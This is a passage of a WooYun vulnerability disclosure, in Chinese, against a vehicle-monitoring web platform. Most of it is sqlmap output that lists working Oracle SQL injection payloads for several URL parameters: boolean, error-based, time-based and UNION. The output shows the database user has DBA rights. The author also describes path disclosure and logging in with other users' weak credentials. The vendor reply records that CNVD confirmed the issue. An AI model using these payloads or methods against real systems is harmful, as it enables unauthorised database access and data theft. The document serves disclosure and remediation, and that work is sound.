Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[23:58:02] [INFO] fetching current user[23:58:02] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[23:58:02] [INFO] fetching current database[23:58:02] [INFO] resumed: SHMOTO[23:58:02] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[23:58:02] [INFO] testing if current user is DBAcurrent user is DBA:    True\n车辆报警数据：\n**.**.**.**/tongji_alarm.php?cc%5B%5D=9&cc%5B%5D=0&cc%5B%5D=8&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2\ncc[]、day1、day2、company_id、chepaihao存在注入\nGET parameter 'chepaihao' is vulnerable. Do you want to keep testing the others(if any)? [y/N] nsqlmap identified the following injection points with a total of 193 HTTP(s) requests:---Place: GETParameter: chepaihao    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2%' AND 7902=7902 AND '%'='&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2%' AND 3244=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3244=3244) THEN 1 ELSE 0END) FROM DUAL)||CHR(113)||CHR(111)||CHR(101)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2%' AND 9308=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(101)||CHR(107)||CHR(88),5) AND '%'='&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: company_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970' AND 8210=8210 AND 'lrXx'='lrXx&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970' AND 8254=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (8254=8254) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(111)||CHR(101)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND 'cKUq'='cKUq&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19&company_id=1970' AND 7966=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(122)||CHR(87)||CHR(102),5) AND 'XlJT'='XlJT&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: cc[]    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cc[]=9&cc[]=0&cc[]=8) AND 8423=8423 AND (4464=4464&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: cc[]=9&cc[]=0&cc[]=8) AND 7189=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(111)||CHR(101)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND (9939=9939&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cc[]=9&cc[]=0&cc[]=8) AND 2096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(103)||CHR(119)||CHR(66)||CHR(108),5) AND (4549=4549&day1=2015-09-12&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: day1    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12' AND 5745=5745 AND 'frCg'='frCg&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12' AND 3173=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3173=3173) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(111)||CHR(101)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND 'RzyE'='RzyE&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12' AND 6165=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(73)||CHR(110)||CHR(65),5) AND 'yOqY'='yOqY&day2=2015-09-19&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2Place: GETParameter: day2    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19' AND 4404=4404 AND 'Cvwl'='Cvwl&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19' AND 9930=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (9930=9930) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(111)||CHR(101)||CHR(114)||CHR(113)||CHR(62))) FROM DUAL) AND 'Oqdi'='Oqdi&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: cc[]=9&cc[]=0&cc[]=8&day1=2015-09-12&day2=2015-09-19' AND 2842=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(115)||CHR(121)||CHR(115),5) AND 'jANQ'='jANQ&company_id=1970&chepaihao=2&sub1=%E6%90%9C%E7%B4%A2---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: cc[], type: Unescaped numeric (default)[1] place: GET, parameter: day1, type: Single quoted string[2] place: GET, parameter: day2, type: Single quoted string[3] place: GET, parameter: company_id, type: Single quoted string[4] place: GET, parameter: chepaihao, type: Single quoted string[q] Quit> 0[00:02:38] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[00:02:38] [INFO] fetching current user[00:02:38] [INFO] retrieved: SHMOTOcurrent user:    'SHMOTO'[00:02:38] [INFO] fetching current database[00:02:38] [INFO] resumed: SHMOTO[00:02:38] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[00:02:38] [INFO] testing if current user is DBAcurrent user is DBA:    True\n分组报警数据：（没有获取到数据）车辆行驶明细：\n**.**.**.**/tongji_xingshi.php?day=2015-09-19&car_number=2222&sub1=%E6%90%9C%E7%B4%A2\ncar_number存在注入\nGET parameter 'car_number' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 144 HTTP(s) requests:---Place: GETParameter: car_number    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: day=2015-09-19&car_number=2222%' AND 4843=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(111)||CHR(118)||CHR(121)||CHR(113)||(SELECT (CASE WHEN (4843=4843) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(99)||CHR(108)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='&sub1=%E6%90%9C%E7%B4%A2    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: day=2015-09-19&car_number=2222%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(111)||CHR(118)||CHR(121)||CHR(113)||CHR(109)||CHR(121)||CHR(90)||CHR(90)||CHR(113)||CHR(65)||CHR(84)||CHR(66)||CHR(122)||CHR(85)||CHR(113)||CHR(112)||CHR(99)||CHR(108)||CHR(113),NULL,NULL,NULL,NULL FROM DUAL-- &sub1=%E6%90%9C%E7%B4%A2---[00:05:38] [INFO] the back-end DBMS is Oracleweb application technology: PHP 5.3.28back-end DBMS: Oracle[00:05:38] [INFO] fetching current usercurrent user:    'SHMOTO'[00:05:38] [INFO] fetching current database[00:05:38] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SHMOTO'[00:05:38] [INFO] testing if current user is DBAcurrent user is DBA:    True\n未使用车辆查询：\n**.**.**.**/tongji_nowork.php?day1=2015-09-14&day2=2015-09-19&company_level=1970&sub1=%E6%90%9C%E7%B4%A2\nday1、day2、company_id存在注入就不继续测试了！~~~7、注入同时也暴露路径！~~~\n**.**.**.**/device_dt.php?imei=356801031781579&company_id=1970'\n如下图！~~~\n\n退出来后，就登录不上去了？这么快就修复好了？我还没有提交，不过后台的注入点可能是有的。不过似乎应该存在撞库的可能哦，没有验证，没有修复！~~~虽然test测试太多被封了，但是还是可以通过其他用户进入，而且比test更多监控哦！~~~看图！~~~\n\n   漏洞证明：  如上   修复方案：  过滤修复修改弱密码！~~~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-09-24 15:57 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向北京市政府信息化主管部门通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}